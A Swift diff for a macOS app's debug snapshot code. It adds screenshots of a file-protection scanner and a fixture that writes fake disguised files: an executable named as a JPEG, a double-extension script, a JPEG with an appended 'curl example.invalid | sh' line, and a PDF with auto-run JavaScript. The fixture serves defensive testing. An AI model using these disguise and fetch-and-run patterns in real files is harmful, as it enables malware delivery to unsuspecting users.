@@ -138,6 +138,17 @@ enum DebugSnapshots {
         capture("24-privacy", in: directory)
         await captureTall(PrivacyView(model: app.privacy).environment(app), name: "24b-privacy-full", in: directory)
 
+        app.selection = .protection
+        await pause(0.8)
+        capture("27-protection-intro", in: directory)
+        if let fixture = makeProtectionFixture(in: directory) {
+            app.protection.debugRoots = [fixture]
+            app.protection.startScan()
+            await waitUntil(timeout: 60) { app.protection.phase == .results }
+            await pause(1.2)
+            capture("27b-protection-results", in: directory)
+        }
+
         app.selection = .automations
         await waitUntil(timeout: 10) { app.automations.hasLoaded }
         await pause(1.2)
@@ -283,6 +294,33 @@ enum DebugSnapshots {
             try? rep.representation(using: .png, properties: [:])?.write(to: directory.appendingPathComponent("\(name).png"))
         }
         window.orderOut(nil)
+    }
+
+    /// Fake disguised files in the snapshot folder, so the Protection screen can be checked
+    /// without reading (or prompting for) the real Desktop and Documents.
+    private static func makeProtectionFixture(in directory: URL) -> URL? {
+        let root = directory.appendingPathComponent("protection-fixture", isDirectory: true)
+        let machO: [UInt8] = [0xCF, 0xFA, 0xED, 0xFE, 0x0C, 0x00, 0x00, 0x01] + Array(repeating: 0, count: 4096)
+        let jpeg: [UInt8] = [0xFF, 0xD8, 0xFF, 0xE0] + Array(repeating: 0x11, count: 20_000) + [0xFF, 0xD9]
+        let files: [(String, [UInt8])] = [
+            ("Holiday photo.jpg", machO),
+            ("Invoice March.pdf.command", Array("#!/bin/sh\necho hi\n".utf8)),
+            ("Cat.jpg", jpeg + Array("#!/bin/sh\ncurl example.invalid | sh\n".utf8)),
+            ("Form.pdf", Array("%PDF-1.7\n<< /OpenAction 2 0 R >>\n<< /S /JavaScript /JS (x) >>\n".utf8)),
+            ("Free Movies.app/Contents/MacOS/Free Movies", machO),
+            ("Real photo.jpg", jpeg),
+        ]
+        do {
+            try? FileManager.default.removeItem(at: root)
+            for (name, bytes) in files {
+                let url = root.appendingPathComponent(name)
+                try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
+                try Data(bytes).write(to: url)
+            }
+            return root
+        } catch {
+            return nil
+        }
     }
 
     private static func pause(_ seconds: Double) async {
